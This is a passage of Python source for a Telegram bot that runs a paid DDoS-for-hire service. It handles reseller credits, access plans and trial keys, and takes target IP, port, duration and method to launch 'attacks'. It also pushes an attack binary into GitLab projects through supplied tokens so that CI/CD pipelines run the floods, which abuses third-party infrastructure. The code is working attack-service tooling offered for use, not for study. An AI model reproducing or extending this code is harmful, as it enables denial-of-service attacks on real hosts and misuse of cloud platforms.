        monitor_thread = threading.Thread(target=monitor_attack_completion)
        monitor_thread.daemon = True
        monitor_thread.start()

    # Add user flow
    elif step == "add_user_id":
        try:
            new_user_id = int(text.strip())
            temp_data[user_id]["new_user_id"] = new_user_id
            temp_data[user_id]["step"] = "add_user_days"

            # Show inline keyboard for days
            keyboard = [
                [InlineKeyboardButton("1 Day", callback_data="days_1"),
                 InlineKeyboardButton("2 Days", callback_data="days_2"),
                 InlineKeyboardButton("3 Days", callback_data="days_3")],
                [InlineKeyboardButton("4 Days", callback_data="days_4"),
                 InlineKeyboardButton("7 Days", callback_data="days_7"),
                 InlineKeyboardButton("30 Days", callback_data="days_30")],
                [InlineKeyboardButton("Lifetime", callback_data="days_0"),
                 InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "➕ **ADD USER - STEP 2/2**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{new_user_id}`\n\n"
                "Select duration:",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    # Remove user flow
    elif step == "remove_user_id":
        try:
            user_to_remove = int(text.strip())
            user_to_remove_str = str(user_to_remove)

            removed = False

            if user_to_remove_str in approved_users:
                del approved_users[user_to_remove_str]
                save_approved_users(approved_users)
                removed = True

            pending_users[:] = [u for u in pending_users if str(u['user_id']) != user_to_remove_str]
            save_pending_users(pending_users)

            if user_to_remove_str in user_attack_counts:
                del user_attack_counts[user_to_remove_str]
                save_user_attack_counts(user_attack_counts)

            if removed:
                reply_markup = get_main_keyboard(user_id)
                await update.message.reply_text(
                    f"✅ **USER ACCESS REMOVED**\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    f"User ID: `{user_to_remove}`\n"
                    f"Removed by: `{user_id}`",
                    reply_markup=reply_markup
                )

                try:
                    await context.bot.send_message(
                        chat_id=user_to_remove,
                        text="🚫 **YOUR ACCESS HAS BEEN REMOVED**\n━━━━━━━━━━━━━━━━━━━━━\nYour access to the bot has been revoked."
                    )
                except:
                    pass
            else:
                await update.message.reply_text(f"❌ **USER NOT FOUND**\nUser ID `{user_to_remove}` not found.")

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    elif step == "find_user_id":
        try:
            lookup_id = int(text.strip())
            lookup_str = str(lookup_id)
            reply_markup = get_main_keyboard(user_id)

            info_lines = [
                f"🔎 **USER INFO** - `{lookup_id}`",
                "━━━━━━━━━━━━━━━━━━━━━"
            ]

            if lookup_str in owners:
                owner_data = owners[lookup_str]
                info_lines.append(f"Role: 👑 OWNER")
                info_lines.append(f"Username: @{owner_data.get('username', 'unknown')}")
                info_lines.append(f"Added: {owner_data.get('added_date', 'unknown')}")
                info_lines.append(f"Primary: {owner_data.get('is_primary', False)}")
            elif lookup_str in admins:
                admin_data = admins[lookup_str]
                info_lines.append(f"Role: 🛡️ ADMIN")
                info_lines.append(f"Username: @{admin_data.get('username', 'unknown')}")
                info_lines.append(f"Added: {admin_data.get('added_date', 'unknown')}")
            elif lookup_str in resellers:
                reseller_data = resellers[lookup_str]
                info_lines.append(f"Role: 💰 RESELLER")
                info_lines.append(f"Expiry: {reseller_data.get('expiry', 'unknown')}")
            elif lookup_str in approved_users:
                approved_data = approved_users[lookup_str]
                info_lines.append(f"Role: 👤 APPROVED USER")
                expiry = approved_data.get('expiry', 'unknown')
                if expiry != 'LIFETIME':
                    try:
                        expiry = time.strftime("%Y-%m-%d", time.localtime(float(expiry)))
                    except Exception:
                        pass
                info_lines.append(f"Expiry: {expiry}")
            elif any(str(u.get('user_id')) == lookup_str for u in pending_users):
                info_lines.append(f"Role: ⏳ PENDING")
            else:
                info_lines.append("Status: User not found in current records.")

            attack_count = user_attack_counts.get(lookup_str, 0)
            info_lines.append(f"Attack count: {attack_count}")

            await update.message.reply_text("\n".join(info_lines), reply_markup=reply_markup)
            del temp_data[user_id]
        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    # Owner add flow
    elif step == "owner_add_id":
        try:
            new_owner_id = int(text.strip())
            temp_data[user_id]["new_owner_id"] = new_owner_id
            temp_data[user_id]["step"] = "owner_add_username"

            await update.message.reply_text(
                "👑 **ADD OWNER - STEP 2/2**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{new_owner_id}`\n\n"
                "Send the username:\n\nExample: `john`"
            )

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    elif step == "owner_add_username":
        username = text.strip()
        new_owner_id = temp_data[user_id]["new_owner_id"]

        if str(new_owner_id) in owners:
            await update.message.reply_text("❌ This user is already an owner")
            del temp_data[user_id]
            return

        owners[str(new_owner_id)] = {
            "username": username,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": False
        }
        save_owners(owners)

        if str(new_owner_id) in admins:
            del admins[str(new_owner_id)]
            save_admins(admins)

        if str(new_owner_id) in resellers:
            del resellers[str(new_owner_id)]
            save_resellers(resellers)

        try:
            await context.bot.send_message(
                chat_id=new_owner_id,
                text="👑 **CONGRATULATIONS!**\n━━━━━━━━━━━━━━━━━━━━━\nYou have been added as an owner of the bot!\nYou now have full access to all admin features."
            )
        except:
            pass

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ **OWNER ADDED**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"Owner ID: `{new_owner_id}`\n"
            f"Username: @{username}\n"
            f"Added by: `{user_id}`",
            reply_markup=reply_markup
        )

        del temp_data[user_id]

    # Owner remove flow
    elif step == "owner_remove_id":
        try:
            owner_to_remove = int(text.strip())

            if str(owner_to_remove) not in owners:
                await update.message.reply_text("❌ This user is not an owner")
                del temp_data[user_id]
                return

            if owners[str(owner_to_remove)].get("is_primary", False):
                await update.message.reply_text("❌ Cannot remove primary owner")
                del temp_data[user_id]
                return

            removed_username = owners[str(owner_to_remove)].get("username", "")
            del owners[str(owner_to_remove)]
            save_owners(owners)

            try:
                await context.bot.send_message(
                    chat_id=owner_to_remove,
                    text="⚠️ **NOTIFICATION**\n━━━━━━━━━━━━━━━━━━━━━\nYour owner access has been revoked from the bot."
                )
            except:
                pass

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **OWNER REMOVED**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"Owner ID: `{owner_to_remove}`\n"
                f"Username: @{removed_username}\n"
                f"Removed by: `{user_id}`",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    # Reseller add flow
    elif step == "reseller_add_id":
        try:
            reseller_id = int(text.strip())
            temp_data[user_id]["reseller_id"] = reseller_id
            temp_data[user_id]["step"] = "reseller_add_credits"

            # Show inline keyboard for credits
            keyboard = [
                [InlineKeyboardButton("50", callback_data="credits_50"),
                 InlineKeyboardButton("100", callback_data="credits_100"),
                 InlineKeyboardButton("200", callback_data="credits_200")],
                [InlineKeyboardButton("500", callback_data="credits_500"),
                 InlineKeyboardButton("1000", callback_data="credits_1000"),
                 InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "💰 **ADD RESELLER - STEP 2/3**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{reseller_id}`\n\n"
                "Select credits:",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    elif step == "reseller_add_username":
        username = text.strip()
        reseller_id = temp_data[user_id]["reseller_id"]
        credits = temp_data[user_id]["credits"]

        if str(reseller_id) in resellers:
            await update.message.reply_text("❌ This user is already a reseller")
            del temp_data[user_id]
            return

        resellers[str(reseller_id)] = {
            "username": username,
            "credits": credits,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": "LIFETIME",
            "total_added": 0
        }
        save_resellers(resellers)

        try:
            await context.bot.send_message(
                chat_id=reseller_id,
                text=f"💰 **CONGRATULATIONS!**\n━━━━━━━━━━━━━━━━━━━━━\nYou have been added as a reseller!\nInitial credits: {credits}\n\nYou can now manage users."
            )
        except:
            pass

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ **RESELLER ADDED**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"Reseller ID: `{reseller_id}`\n"
            f"Username: @{username}\n"
            f"Credits: {credits}\n"
            f"Added by: `{user_id}`",
            reply_markup=reply_markup
        )

        del temp_data[user_id]

    # Reseller remove flow
    elif step == "reseller_remove_id":
        try:
            reseller_to_remove = int(text.strip())

            if str(reseller_to_remove) not in resellers:
                await update.message.reply_text("❌ This user is not a reseller")
                del temp_data[user_id]
                return

            removed_username = resellers[str(reseller_to_remove)].get("username", "")
            del resellers[str(reseller_to_remove)]
            save_resellers(resellers)

            try:
                await context.bot.send_message(
                    chat_id=reseller_to_remove,
                    text="⚠️ **NOTIFICATION**\n━━━━━━━━━━━━━━━━━━━━━\nYour reseller access has been revoked from the bot."
                )
            except:
                pass

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **RESELLER REMOVED**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"Reseller ID: `{reseller_to_remove}`\n"
                f"Username: @{removed_username}\n"
                f"Removed by: `{user_id}`",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    # Token add flow - MODIFIED FOR GROUP-BASED
    elif step == "token_add":
        try:
            # Parse token,group_id format
            parts = text.strip().split(',')
            if len(parts) != 2:
                await update.message.reply_text("❌ **INVALID FORMAT**\n\nUse format: `token,group_id`\n\nExample: `glpat-xxxxx,12345678`")
                return

            token = parts[0].strip()
            group_id = parts[1].strip()

            # Check if group already exists under any token
            for existing_token in gitlab_tokens:
                if existing_token['group_id'] == group_id:
                    await update.message.reply_text(
                        "❌ This group is already configured.\n"
                        "Use the existing group token or remove the old group first."
                    )
                    del temp_data[user_id]
                    return

            await update.message.reply_text("🔄 **SETTING UP GROUP...**\nThis may take a moment.")

            # Automatic setup: find/create project, upload binary, setup CI/CD
            binary_content = None
            if os.path.exists(BINARY_FILE_NAME):
                with open(BINARY_FILE_NAME, 'rb') as f:
                    binary_content = f.read()

            success, project_id, setup_message = setup_group_automatically(token, group_id, binary_content)

            if not success:
                await update.message.reply_text(f"❌ **SETUP FAILED**\n━━━━━━━━━━━━━━━━━━━━━\n{setup_message}")
                del temp_data[user_id]
                return

            # Get group info
            gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
            gl.auth()
            group = gl.groups.get(group_id)
            group_name = group.name

            # Get project info
            project, project_name, _ = get_target_project_from_group(token, group_id)

            new_token_data = {
                'token': token,
                'group_id': group_id,
                'group_name': group_name,
                'project_id': project_id,
                'project_name': project_name,
                'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'status': 'active'
            }
            gitlab_tokens.append(new_token_data)
            save_gitlab_tokens(gitlab_tokens)

            reply_markup = get_main_keyboard(user_id)
            message = (
                f"✅ **GROUP ADDED & CONFIGURED!**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"📁 Group: `{group_name}`\n"
                f"🆔 Group ID: `{group_id}`\n"
                f"📦 Project: `{project_name}`\n"
                f"📊 Total groups: {len(gitlab_tokens)}\n\n"
                f"⚡ {setup_message}"
            )

            await update.message.reply_text(message, reply_markup=reply_markup)
            del temp_data[user_id]

        except Exception as e:
            await update.message.reply_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━\n{str(e)}\n\nPlease check token and group ID.")
            del temp_data[user_id]

    # Token remove flow
    elif step == "token_remove":
        try:
            token_num = int(text.strip())
            if token_num < 1 or token_num > len(gitlab_tokens):
                await update.message.reply_text(f"❌ Invalid number. Use 1-{len(gitlab_tokens)}")
                del temp_data[user_id]
                return

            removed_token = gitlab_tokens.pop(token_num - 1)
            save_gitlab_tokens(gitlab_tokens)

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **GROUP REMOVED!**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"📁 Group: `{removed_token.get('group_name', 'Unknown')}`\n"
                f"🆔 ID: `{removed_token.get('group_id', 'Unknown')}`\n"
                f"📊 Remaining: {len(gitlab_tokens)}",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text("❌ **INVALID NUMBER**\nPlease send a valid number.")

    # Broadcast flow
    elif step == "broadcast_message":
        message = text
        del temp_data[user_id]
        await send_broadcast(update, context, message, user_id)

    # Binary upload flow
    elif step == "binary_upload":
        await update.message.reply_text("❌ **PLEASE SEND A FILE**\nNot text. Send your binary file.")

# ==================== CALLBACK QUERY HANDLER ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    # Cancel operation
    if data == "cancel_operation":
        if user_id in temp_data:
            del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await query.message.reply_text("❌ **OPERATION CANCELLED**", reply_markup=reply_markup)
        await query.message.delete()
        return

    # Trial key generation
    if data.startswith("trial_"):
        hours = int(data.split("_")[1])
        key = generate_trial_key(hours)

        await query.message.edit_text(
            f"🔑 **TRIAL KEY GENERATED**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"Key: `{key}`\n"
            f"Duration: {hours} hours\n"
            f"Expires: in {hours} hours\n\n"
            "Users can redeem with this key."
        )
        return

    # Cooldown setting
    if data.startswith("cooldown_"):
        cooldown = int(data.split("_")[1])

        global COOLDOWN_DURATION
        COOLDOWN_DURATION = cooldown
        save_cooldown(cooldown)

        await query.message.edit_text(
            f"✅ **COOLDOWN UPDATED**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"New cooldown: `{COOLDOWN_DURATION}` seconds"
        )
        return

    # Max attacks setting
    if data.startswith("maxattack_"):
        max_attacks = int(data.split("_")[1])

        global MAX_ATTACKS
        MAX_ATTACKS = max_attacks
        save_max_attacks(max_attacks)

        await query.message.edit_text(
            f"✅ **MAXIMUM ATTACKS UPDATED**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"New limit: `{MAX_ATTACKS}` attack(s) per user"
        )
        return

    # Attack time setting - MODIFIED TO USE group_id
    if data.startswith("attack_time_"):
        attack_duration = int(data.split("_")[2])

        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**\nPlease start again.")
            return

        ip = temp_data[user_id]["ip"]
        port = temp_data[user_id]["port"]
        method = temp_data[user_id]["method"]

        del temp_data[user_id]

        await query.message.edit_text("🔄 **STARTING ATTACK...**")

        start_attack(ip, port, attack_duration, user_id, method)

        results = process_attack_tokens(ip, port, attack_duration, method)
        success_count = sum(1 for _, success in results if success)
        fail_count = len(results) - success_count

        user_id_str = str(user_id)
        remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)

        reply_markup = get_main_keyboard(user_id)
        message = (
            f"🎯 **ATTACK STARTED!**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Target: `{ip}`\n"
            f"🚪 Port: `{port}`\n"
            f"⏱️ Time: `{attack_duration}s`\n"
            f"🖥️ Groups: `{success_count}`\n"
            f"⚡ Method: {method}\n"
            f"⏳ Cooldown: {COOLDOWN_DURATION}s after attack\n"
            f"🎯 Remaining attacks: {remaining_attacks}/{MAX_ATTACKS}"
        )

        await query.message.edit_text(message)
        await query.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)

        def monitor_attack_completion():
            time.sleep(attack_duration)
            finish_attack()
            logger.info(f"Attack completed automatically after {attack_duration} seconds")

        monitor_thread = threading.Thread(target=monitor_attack_completion)
        monitor_thread.daemon = True
        monitor_thread.start()

        return

    # Add user days selection
    if data.startswith("days_"):
        days = int(data.split("_")[1])

        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**\nPlease start again.")
            return

        new_user_id = temp_data[user_id]["new_user_id"]
        del temp_data[user_id]

        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
        save_pending_users(pending_users)

        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 24 * 60 * 60)

        approved_users[str(new_user_id)] = {
            "username": f"user_{new_user_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_approved_users(approved_users)

        try:
            await context.bot.send_message(
                chat_id=new_user_id,
                text=f"✅ **ACCESS APPROVED!**\n━━━━━━━━━━━━━━━━━━━━━\nYour access has been approved for {days if days > 0 else 'lifetime'} {'days' if days > 1 else ('day' if days == 1 else '')}."
            )
        except:
            pass

        reply_markup = get_main_keyboard(user_id)
        await query.message.edit_text(
            f"✅ **USER ADDED**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"User ID: `{new_user_id}`\n"
            f"Duration: {days if days > 0 else 'Lifetime'} {'days' if days > 1 else ('day' if days == 1 else '')}\n"
            f"Added by: `{user_id}`"
        )
        await query.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)
        return

    # Reseller credits selection
    if data.startswith("credits_"):
        credits = int(data.split("_")[1])

        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**\nPlease start again.")
            return

        temp_data[user_id]["credits"] = credits
        temp_data[user_id]["step"] = "reseller_add_username"

        reply_markup = get_cancel_keyboard()
        await query.message.edit_text(
            "💰 **ADD RESELLER - STEP 3/3**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ User ID: `{temp_data[user_id]['reseller_id']}`\n"
            f"✅ Credits: `{credits}`\n\n"
            "Send the username:\n\nExample: `john`"
        )
        await query.message.reply_text("Type username:", reply_markup=reply_markup)
        return

# ==================== BROADCAST HANDLER ====================

async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, message: str, user_id):
    all_users = set()

    for uid in approved_users.keys():
        all_users.add(int(uid))

    for uid in resellers.keys():
        all_users.add(int(uid))

    for uid in admins.keys():
        all_users.add(int(uid))

    for uid in owners.keys():
        all_users.add(int(uid))

    total_users = len(all_users)
    success_count = 0
    fail_count = 0

    progress_msg = await update.message.reply_text(
        f"📢 **SENDING BROADCAST...**\n"
        f"Total users: {total_users}"
    )

    for uid in all_users:
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"📢 **BROADCAST**\n━━━━━━━━━━━━━━━━━━━━━\n{message}"
            )
            success_count += 1
            await asyncio.sleep(0.05)
        except:
            fail_count += 1

    reply_markup = get_main_keyboard(user_id)
    await progress_msg.edit_text(
        f"✅ **BROADCAST COMPLETED**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"• ✅ Successful: {success_count}\n"
        f"• ❌ Failed: {fail_count}\n"
        f"• 📊 Total: {total_users}\n"
        f"• 📝 Message: {message[:50]}..."
    )
    await update.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)

# ==================== FILE HANDLERS ====================

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle both binary file uploads and token file uploads"""
    user_id = update.effective_user.id

    if user_id not in temp_data:
        return

    step = temp_data[user_id].get("step")

    # Binary upload handler
    if step == "binary_upload":
        if not update.message.document:
            await update.message.reply_text("❌ **PLEASE SEND A FILE**\nNot text. Send your binary file.")
            return

        del temp_data[user_id]

        progress_msg = await update.message.reply_text("📥 **DOWNLOADING YOUR BINARY FILE...**")

        try:
            file = await update.message.document.get_file()
            file_path = f"temp_binary_{user_id}.bin"
            await file.download_to_drive(file_path)

            with open(file_path, 'rb') as f:
                binary_content = f.read()

            file_size = len(binary_content)

            # Save as 'soul' for future use
            with open(BINARY_FILE_NAME, 'wb') as f:
                f.write(binary_content)

            await progress_msg.edit_text(
                f"📊 **FILE DOWNLOADED: {file_size} bytes**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "📤 Uploading to all GitLab projects..."
            )

            success_count = 0
            fail_count = 0
            results = []

            def upload_to_project(token_data):
                try:
                    # Get target project from group
                    project, project_name, error = get_target_project_from_group(
                        token_data['token'],
                        token_data['group_id']
                    )

                    if project is None:
                        results.append((token_data.get('group_name', 'Unknown'), False, error))
                        return

                    gl = gitlab.Gitlab('https://gitlab.com', private_token=token_data['token'])
                    gl.auth()
                    full_project = gl.projects.get(project.id)

                    # Encode binary content as base64 for GitLab API
                    import base64
                    encoded_content = base64.b64encode(binary_content).decode('utf-8')

                    try:
                        # Try to get existing file
                        file = full_project.files.get(file_path=BINARY_FILE_NAME, ref='main')
                        # Update existing file
                        file.content = encoded_content
                        file.encoding = 'base64'
                        file.save(branch='main', commit_message="Update binary file")
                        results.append((token_data.get('group_name', 'Unknown'), True, "Updated"))
                    except GitlabGetError:
                        # Create new file
                        full_project.files.create({
                            'file_path': BINARY_FILE_NAME,
                            'branch': 'main',
                            'content': encoded_content,
                            'encoding': 'base64',
                            'commit_message': "Upload binary file"
                        })
                        results.append((token_data.get('group_name', 'Unknown'), True, "Created"))

                except Exception as e:
                    results.append((token_data.get('group_name', 'Unknown'), False, str(e)))

            threads = []
            for token_data in gitlab_tokens:
                thread = threading.Thread(target=upload_to_project, args=(token_data,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            for group_name, success, status in results:
                if success:
                    success_count += 1
                else:
                    fail_count += 1

            os.remove(file_path)

            reply_markup = get_main_keyboard(user_id)
            message = (
                f"✅ **BINARY UPLOAD COMPLETED!**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 **Results:**\n"
                f"• ✅ Successful: {success_count}\n"
                f"• ❌ Failed: {fail_count}\n"
                f"• 📊 Total: {len(gitlab_tokens)}\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"📁 **File:** `{BINARY_FILE_NAME}`\n"
                f"📦 **File size:** {file_size} bytes\n"
                f"⚙️ **Binary ready:** ✅"
            )

            await progress_msg.edit_text(message)
            await update.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)

        except Exception as e:
            await progress_msg.edit_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━\n{str(e)}")

    # NEW: Token file upload handler
    elif step == "token_file_upload":
        if not update.message.document:
            await update.message.reply_text("❌ **PLEASE SEND A FILE**\nNot text. Send your .txt file.")
            return

        del temp_data[user_id]

        progress_msg = await update.message.reply_text("📥 **DOWNLOADING TOKEN FILE...**")

        try:
            file = await update.message.document.get_file()
            file_path = f"temp_tokens_{user_id}.txt"
            await file.download_to_drive(file_path)

            # Read and parse file
            with open(file_path, 'r') as f:
                lines = f.readlines()

            await progress_msg.edit_text(
                f"📊 **FILE LOADED: {len(lines)} entries**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "🔄 Processing tokens..."
            )

            # Load binary content if available for automatic setup
            binary_content = None
            if os.path.exists(BINARY_FILE_NAME):
                with open(BINARY_FILE_NAME, 'rb') as f:
                    binary_content = f.read()

            success_count = 0
            fail_count = 0
            skipped_count = 0
            results = []
            seen_groups = set()

            for line_num, line in enumerate(lines, 1):
                line = line.strip()
                if not line or line.startswith('#'):  # Skip empty lines and comments
                    continue

                # Parse token,group_id format
                parts = line.split(',')
                if len(parts) != 2:
                    results.append((line_num, "❌", "Invalid format"))
                    fail_count += 1
                    continue

                token = parts[0].strip()
                group_id = parts[1].strip()

                if group_id in seen_groups:
                    results.append((line_num, "⏭️", f"Duplicate group in file (Group {group_id})"))
                    skipped_count += 1
                    continue

                # Check if group already exists under any token
                exists = False
                for existing_token in gitlab_tokens:
                    if existing_token['group_id'] == group_id:
                        results.append((line_num, "⏭️", f"Group already exists (Group {group_id})"))
                        skipped_count += 1
                        exists = True
                        break

                if exists:
                    continue

                seen_groups.add(group_id)

                # Try to setup group
                try:
                    success, project_id, setup_message = setup_group_automatically(token, group_id, binary_content)

                    if not success:
                        results.append((line_num, "❌", f"Setup failed: {setup_message}"))
                        fail_count += 1
                        continue

                    # Get group and project info
                    gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
                    gl.auth()
                    group = gl.groups.get(group_id)
                    group_name = group.name

                    project, project_name, _ = get_target_project_from_group(token, group_id)

                    new_token_data = {
                        'token': token,
                        'group_id': group_id,
                        'group_name': group_name,
                        'project_id': project_id,
                        'project_name': project_name,
                        'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                        'status': 'active'
                    }
                    gitlab_tokens.append(new_token_data)
                    save_gitlab_tokens(gitlab_tokens)

                    results.append((line_num, "✅", f"{group_name} (ID: {group_id})"))
                    success_count += 1

                except Exception as e:
                    results.append((line_num, "❌", f"Error: {str(e)[:50]}"))
                    fail_count += 1

            # Clean up temp file
            os.remove(file_path)

            # Generate summary
            summary = (
                f"📤 **BULK TOKEN UPLOAD COMPLETED**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Success: {success_count}\n"
                f"❌ Failed: {fail_count}\n"
                f"⏭️ Skipped: {skipped_count}\n"
                f"📊 Total processed: {len(lines)}\n"
                f"📊 Total groups now: {len(gitlab_tokens)}\n\n"
            )

            # Show first 10 results
            if results:
                summary += "📋 **Results (first 10):**\n"
                for line_num, status, message in results[:10]:
                    summary += f"L{line_num}: {status} {message}\n"

                if len(results) > 10:
                    summary += f"\n... and {len(results) - 10} more"

            reply_markup = get_main_keyboard(user_id)
            await progress_msg.edit_text(summary)
            await update.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)

        except Exception as e:
            await progress_msg.edit_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━\n{str(e)}")
            if os.path.exists(file_path):
                os.remove(file_path)

def main():
    proxy_url = os.getenv('HTTPS_PROXY') or os.getenv('https_proxy') or os.getenv('HTTP_PROXY') or os.getenv('http_proxy')
    request = HTTPXRequest(
        connect_timeout=10.0,
        read_timeout=20.0,
        write_timeout=20.0,
        pool_timeout=5.0,
        proxy=proxy_url
    )

    application = Application.builder().token(BOT_TOKEN).request(request).build()

    # Button callback handler for inline keyboards
    application.add_handler(CallbackQueryHandler(button_callback))

    # Start command
    application.add_handler(CommandHandler("start", start))

    # File handler for binary upload AND token file upload
    application.add_handler(MessageHandler(filters.Document.ALL, handle_binary_file))

    # Text message handler for all button presses and text input
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_press))

    print("🤖 **THE BOT IS RUNNING...**")
    print("━━━━━━━━━━━━━━━━━━━━━")
    print(f"👑 Primary owners: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
    print(f"👑 Secondary owners: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
    print(f"📊 Approved users: {len(approved_users)}")
    print(f"💰 Resellers: {len(resellers)}")
    print(f"📁 Groups: {len(gitlab_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max attacks: {MAX_ATTACKS}")
    print(f"🌐 Proxy: {proxy_url or 'None'}")
    print("━━━━━━━━━━━━━━━━━━━━━")

    try:
        application.run_polling(poll_interval=1.0, timeout=20, bootstrap_retries=5)
    except Exception as e:
        logger.error("Bot startup failed: %s", e)
        print("❌ Bot startup failed. Verify network connectivity, proxy settings, and token validity.")
        raise

if __name__ == '__main__':
    main()
